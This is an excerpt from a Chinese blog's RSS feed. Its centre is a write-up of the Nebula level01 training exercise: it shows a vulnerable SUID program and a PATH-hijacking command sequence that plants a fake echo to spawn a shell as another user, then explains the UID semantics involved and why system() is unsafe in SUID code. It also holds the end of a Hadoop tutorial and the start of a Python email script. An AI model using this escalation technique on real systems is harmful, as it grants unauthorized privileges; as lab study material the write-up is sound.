&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;javac&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;classpath&lt;/span&gt; &lt;span class="n"&gt;hadoop&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;hop&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;0.2&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;core&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;jar&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="n"&gt;wordcount_classes&lt;/span&gt; &lt;span class="n"&gt;WordCount&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;java&lt;/span&gt;
&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;jar&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;cvf&lt;/span&gt; &lt;span class="n"&gt;wordcount&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;jar&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt; &lt;span class="n"&gt;wordcount_classes&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 然后自行构造一些要统计的文件，放在 input 目录下。这时候注意，在执行了上一次例子后，如果想把输入文件还是放在 HDFS 的 input 下，要先清空原来的文件 :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;hadoop&lt;/span&gt; &lt;span class="n"&gt;fs&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rmr&lt;/span&gt; &lt;span class="n"&gt;input&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;hadoop&lt;/span&gt; &lt;span class="n"&gt;fs&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rmr&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;

&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;hadoop&lt;/span&gt; &lt;span class="n"&gt;fs&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;put&lt;/span&gt; &lt;span class="n"&gt;input&lt;/span&gt; &lt;span class="n"&gt;input&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="err"&gt; 把输入文件目录 &lt;/span&gt;&lt;span class="n"&gt;input&lt;/span&gt;&lt;span class="err"&gt; 重新放到 &lt;/span&gt;&lt;span class="n"&gt;HDFS&lt;/span&gt;&lt;span class="err"&gt; 中 &lt;/span&gt;
&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;hadoop&lt;/span&gt; &lt;span class="n"&gt;jar&lt;/span&gt; &lt;span class="n"&gt;wordcount&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;jar&lt;/span&gt; &lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;myorg&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;WordCount&lt;/span&gt; &lt;span class="n"&gt;input&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt;  &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="err"&gt; 执行 &lt;/span&gt;&lt;span class="n"&gt;wordcount&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;jar&lt;/span&gt;

&lt;span class="cp"&gt;# 执行一段时间后完毕 #&lt;/span&gt;

&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;hadoop&lt;/span&gt; &lt;span class="n"&gt;fs&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="o"&gt;/*&lt;/span&gt;  &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="err"&gt; 打印结果 &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id="_3"&gt; 结语 &lt;/h2&gt;
&lt;p&gt; 尝试了一下 Hadoop，还有更多有待研究 &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Sun, 21 Oct 2012 23:47:00 +0800</pubDate><guid>tag:www.goorockey.com,2012-10-21:blog/2012/10/21/wan-xia-hadoop/</guid><category>hadoop</category><category>programming</category></item><item><title>关于exploit exercise nebula level01</title><link>http://www.goorockey.com/blog/2012/10/10/guan-yu-exploit-exercise-nebula-level01/</link><description>
&lt;p&gt; 今天做 &lt;a href="http://exploit-exercises.com/"&gt;exploit exercise&lt;/a&gt; 的 nebula &lt;a href="http://exploit-exercises.com/nebula/level01"&gt;level01&lt;/a&gt;，长见识了，记录一下。&lt;/p&gt;
&lt;h2 id="_1"&gt; 题目 &lt;/h2&gt;
&lt;p&gt; 题目提供了 /home/flag01/ 下 flag01 的源码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;envp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;gid_t&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;uid_t&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;gid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getegid&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="n"&gt;uid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;geteuid&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

    &lt;span class="n"&gt;setresgid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;setresuid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"/usr/bin/env echo and now what?"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;flag01 的权限：&lt;/p&gt;
&lt;p&gt;-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01&lt;/p&gt;
&lt;p&gt;flag01 的 uid 是用户 flag01,gid 是 level01,suid 位被使能了 &lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;&lt;strong&gt; 解决方法 &lt;/strong&gt; 网上都有：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;export&lt;/span&gt; &lt;span class="n"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;PATH&lt;/span&gt;    &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="err"&gt; 把 &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="err"&gt; 加到环境变量 &lt;/span&gt;&lt;span class="n"&gt;PATH&lt;/span&gt;&lt;span class="err"&gt; 的最前头 &lt;/span&gt;
&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="s"&gt;"/bin/bash"&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;echo&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="err"&gt; 在 &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="err"&gt; 创建一个 &lt;/span&gt;&lt;span class="n"&gt;echo&lt;/span&gt;&lt;span class="err"&gt; 文件，里面是执行 &lt;/span&gt;&lt;span class="n"&gt;bash&lt;/span&gt;
&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;chmod&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;echo&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="err"&gt; 把 &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;echo&lt;/span&gt;&lt;span class="err"&gt; 设为执行文件 &lt;/span&gt;
&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;flag01&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;flag01&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="err"&gt; 执行 &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;flag01&lt;/span&gt;&lt;span class="err"&gt; 下的 &lt;/span&gt;&lt;span class="n"&gt;flag01&lt;/span&gt;

&lt;span class="cp"&gt;# 顺利以用户 flag01 起 bash&lt;/span&gt;
&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;getflag&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="err"&gt; 通关 &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id="_2"&gt; 原理 &lt;/h2&gt;
&lt;p&gt; 主要原理网上的解法都说得很明白，就是通过 env 使得执行的 echo 是我们创建的假 echo，成功以用户 flag01 的权限起 bash&lt;/p&gt;
&lt;p&gt; 我想记录的主要是前面关于 uid,gid 的操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; 为什么 system 之前会有 getegid,setresgid 这些操作呢？没有会怎样？这还会成功吗？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; 答案是不行的！在 &lt;a href="http://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code"&gt;stackoverflow&lt;/a&gt; 找到解答 :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Note that the setting of real user ID, effective user ID and saved set-user-ID by a call to setresuid() before the call to system() in the vulnerable code posted in the question allows one to exploit the vulnerability even when only effective user ID is set to a privileged user ID and real user ID remains unprivileged (as is for example the case when relying on set-user-ID bit on a file as above). Without the call to setresuid() the shell run by system() would reset the effective user ID back to the real user ID making the exploit ineffective. However, in the case when the vulnerable code is run with real user ID of a privileged user, system() call alone is enough.&lt;/p&gt;
&lt;p&gt;man page of sh:&lt;/p&gt;
&lt;p&gt;If the shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no startup files are read, shell functions are not inherited from the environment, the SHELLOPTS variable, if it appears in the environment, is ignored, and the effective user id is set to the real user id. If the -p option is supplied at invocation, the startup behavior is the same, but the effective user id is not reset.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id="real-user-id-effective-user-idsaved-set-user-id-set-user-id-bit"&gt;real user ID, effective user ID，saved set-user-ID, set-user-ID bit&lt;/h2&gt;
&lt;p&gt; 首先明确什么是 real user ID, effective user ID，saved set-user-ID, set-user-ID bit&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;real user ID 就是起进程的用户 ID。&lt;/li&gt;
&lt;li&gt;effective user ID 是进程的有效用户 ID，决定这个进程对文件系统操作的权限。如果它是 root，那这个进程的操作就是以 root 的权限了。&lt;/li&gt;
&lt;li&gt;set-user-id bit 是程序的一个特征位，默认不使能，可以通过 chmod +s 设置。当 set-user-id 被使能时，此程序叫 SUID 程序，程序启动时进程的 effective user ID 就是这个程序的 uid；当 set-user-id 没被使能，则 effective user ID 是执行者 real user ID。&lt;/li&gt;
&lt;li&gt;saved set-user-ID 保存着进程启动时 effective user ID 的值。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 因为进程内可以通过 setuid 等来设置 effective user ID，也就改变了进程对文件系统操作的权限。但这不是可以随便设为任意的 id 的。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt; 如果进程有管理员权限，则 setuid 可以把 effective user ID 设为任意 id.&lt;/li&gt;
&lt;li&gt; 如果进程没有管理员权限，则 setuid 只能把 effective user ID 设为 real user ID 或者 saved set-user-id。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 这就知道 saved set-user-ID 有什么用了。它就是当程序是 SUID 程序时，effective user ID 可以被设为 real user ID 和程序启动时的 effective user ID，saved set-user-ID 就是用来保存这个程序启动时 effective user ID 的值的，使得 setuid 可以把 effective user ID 可以从 real user ID 设回来。&lt;/p&gt;
&lt;h2 id="bash"&gt;bash&lt;/h2&gt;
&lt;p&gt; 然后就是起 bash 时，如果 effective user ID 跟 real user ID 不同，且 real user ID 不是管理员权限用户，则会把 effective user ID 设回 real user ID。&lt;/p&gt;
&lt;p&gt; 而我们这样如果没有 setresgid,setresuid 的话，real user ID 是 level01, effective user ID 是 flag01, 起 bash 时，effective user ID 会被设回 real user ID，那还只是以 level01 起 bash，而不是 flag01 起 bash 了。&lt;/p&gt;
&lt;h2 id="system"&gt;system() 的安全问题 &lt;/h2&gt;
&lt;p&gt; 在这里也可以看到 system() 是有安全问题的，因为 system() 里面是 fork 完就直接调用 execl，使得继承了父进程的 effective user ID 的子进程执行新的程序。&lt;/p&gt;
&lt;p&gt;APUE 也说了 :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If it is running with special permissions--eithere set-user-ID or set-group-ID--and wants to spawn another process, a process should use fork() and exec() directly, being certain to change back to normal permissions after the fork(), before calling exec(). The system() function should never be used from a set-user-ID or a set-groupd-ID program.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt; 意思在 SUID 程序中，不应该用 system()，而是自己写 fork() 和 exec() 来实现，并在 fork 和 exec 中间，自己处理好 id 权限问题。&lt;/p&gt;
&lt;h2 id="_3"&gt; 结语 &lt;/h2&gt;
&lt;p&gt; 之前看 APUE，用户 id 这里看得一头雾水，通过这个 exercise，总算有点感觉了。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Wed, 10 Oct 2012 23:26:00 +0800</pubDate><guid>tag:www.goorockey.com,2012-10-10:blog/2012/10/10/guan-yu-exploit-exercise-nebula-level01/</guid><category>linux</category><category>security</category><category>programming</category></item><item><title>python发邮件脚本</title><link>http://www.goorockey.com/blog/2012/09/30/pythonfa-you-jian-jiao-ben/</link><description>
&lt;p&gt; 项目组有每天值日搞卫生和发工作日报的规定，由于不提醒容易忘记，则想到通过内部邮件定时提醒，练练手。&lt;/p&gt;
&lt;p&gt; 整个 “ 任务 ” 可以分为发邮件 + 定时两部分。&lt;/p&gt;
&lt;hr/&gt;
&lt;h2 id="1"&gt;1. 发邮件 &lt;/h2&gt;
&lt;p&gt; 由于服务器是 windows 系统，google 得知，windows 下有 &lt;a href="http://www.blat.net"&gt;blat&lt;/a&gt; 这发邮件的大杀器，所以刚开始是想用 blat+ 批处理做的。&lt;/p&gt;
&lt;p&gt; 执行 blat -h 或者看官网上的帮助，使用 blat 发邮件还是很简单的（所以官网特别提醒不要用 blat 来发 SPAM。。)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;blat&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt; 邮件正文文件 &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt; 发送地址 &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt; 接受地址 &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;subject&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt; 邮件标题 &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; 
        &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;server&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;smtp&lt;/span&gt;&lt;span class="err"&gt; 服务器地址 &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt; 登录服务器用户名 &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt; 密码 &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="n"&gt;blat&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt; 邮件正文 &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt; 发送地址 &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt; 接受地址 &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;subject&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt; 邮件标题 &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; 
        &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;server&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;smtp&lt;/span&gt;&lt;span class="err"&gt; 服务器地址 &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt; 登录服务器用户名 &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt; 密码 &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;blat 还可以通过 -install 把参数保存到注册表。blat 确实是自动发邮件的大杀器！&lt;/p&gt;
&lt;p&gt;&lt;em&gt;P.S 在 linux 实现自动发邮件，可以用 msmtp,sendmail 等～&lt;/em&gt;&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt; 这本来是很简单的，但因为任务要根据星期几发送邮件给指定的人，而且我们是 12 个人分成两周，所以想到用一个二维数组存放成员来实现，这也没什么问题。&lt;/p&gt;
&lt;p&gt; 问题在于在计算要提醒的人时，要根据今天离开始值日的天数，来从数组获取成员，而这求天数在 windows 用批处理可不好搞，因为要考虑每月不同天数和闰年啊。&lt;/p&gt;
&lt;p&gt; 当然也不是不能完成，网上也有方法 :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://bbs.bathome.net/thread-11128-1-1.html"&gt;http://bbs.bathome.net/thread-11128-1-1.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://bbs.bathome.net/viewthread.php?tid=5659&amp;amp;highlight=%2Bbatman"&gt;http://bbs.bathome.net/viewthread.php?tid=5659&amp;amp;highlight=%2Bbatman&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://bbs.bathome.net/viewthread.php?tid=5682&amp;amp;highlight=%2Bbatman"&gt;http://bbs.bathome.net/viewthread.php?tid=5682&amp;amp;highlight=%2Bbatman&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 嫌麻烦，我还是决定找有现成库的方法来做，所以就想到用有各种库的 python 实现了。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;hr/&gt;
&lt;p&gt;python 有 &lt;a href="http://docs.python.org/library/smtplib.html" title="smtplib"&gt;smtplib&lt;/a&gt; 库实现 smtp 发邮件，核心代码也很简单：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;import&lt;/span&gt; &lt;span class="n"&gt;smtplib&lt;/span&gt;
&lt;span class="cp"&gt;# some code ...&lt;/span&gt;
&lt;span class="n"&gt;smtp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;smtplib&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SMTP&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;smtp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;smtp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;smtp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendmail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sender&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;receiver&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;smtp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;quit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 而用 python 计算相差的天数更是简单不过：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;import&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;
&lt;span class="cp"&gt;# some code ...&lt;/span&gt;
&lt;span class="n"&gt;days&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2012&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;)).&lt;/span&gt;&lt;span class="n"&gt;days&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id="2"&gt;2. 定时 &lt;/h2&gt;
&lt;p&gt; 定时在 windows 可以用计划任务实现 &lt;/p&gt;
&lt;p&gt;P.S 在 linux 可以用 cron 实现 &lt;/p&gt;
&lt;h2 id="3"&gt;3. 整个代码 &lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#coding=utf-8&lt;/span&gt;
&lt;span class="n"&gt;import&lt;/span&gt; &lt;span class="n"&gt;smtplib&lt;/span&gt;
&lt;span class="n"&gt;import&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;
&lt;span class="n"&gt;import&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;

&lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mime&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt; &lt;span class="n"&gt;MIMEText&lt;/span&gt;
&lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;header&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Header&lt;/span&gt;


